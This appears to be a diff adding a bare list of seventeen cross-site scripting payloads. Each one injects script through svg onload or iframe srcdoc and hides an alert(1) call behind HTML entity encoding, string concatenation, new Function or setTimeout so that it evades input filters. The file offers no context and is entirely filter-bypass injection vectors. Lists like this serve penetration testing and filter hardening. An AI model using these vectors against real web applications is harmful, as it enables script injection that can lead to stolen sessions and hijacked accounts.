@@ -1,0 +1,17 @@
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#116;&lpar;&#39;1&#39;&rpar;>">
+<iframe srcdoc="<iframe onload=&#x61;lert&#x28;&#x31;&#x29;>">
+<svg onload="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<iframe srcdoc="<svg onload=window['ale'+'rt'](1)>">
+<svg onload="new Function(&#39;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#39;)()">
+<iframe srcdoc="<script>window&#46;&#x61;lert(1)</script>">
+<svg onload="setTimeout(`&#x61;lert(1)`,0)">
+<iframe srcdoc="<svg onload=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#40;&#x31;&#41;>">
+<svg onload="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#49;&#x29;">
+<iframe srcdoc="<script>alert&#x28;&#49;&#x29;</script>">
+<svg onload="window&#91;&#39;&#97;&#x6c;&#x65;&#x72;&#x74;&#39;&#93;&#x28;&#x31;&#x29;">
+<iframe srcdoc="<svg onload=&#97;&#108;&#101;&#114;&#x74;&#40;&#x31;&#x29;>">
+<svg onload="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<iframe srcdoc="<svg onload=window&#x2e;aler&#x74;&#x28;&#x31;&#x29;>">
+<svg onload="new Function(&#x22;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x22;)()">
+<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+<iframe srcdoc="<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>">
